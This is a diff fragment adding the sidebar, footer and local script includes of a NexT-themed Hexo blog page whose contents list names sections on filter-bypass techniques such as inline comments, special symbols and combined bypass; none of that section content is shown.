class="nav-item nav-level-4"><a class="nav-link" href="#2-内联注释"><span class="nav-number">6.2.</span> <span class="nav-text">2.内联注释</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#e-等价函数与命令"><span class="nav-number">7.</span> <span class="nav-text">e)等价函数与命令</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#f-特殊符号"><span class="nav-number">8.</span> <span class="nav-text">f) 特殊符号</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#g-缓冲区溢出-Advanced"><span class="nav-number">9.</span> <span class="nav-text">g) 缓冲区溢出(Advanced)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#i-整合绕过"><span class="nav-number">10.</span> <span class="nav-text">i) 整合绕过</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Caoyifan</span>
+
+  
+</div>
+
+
+
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a></div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
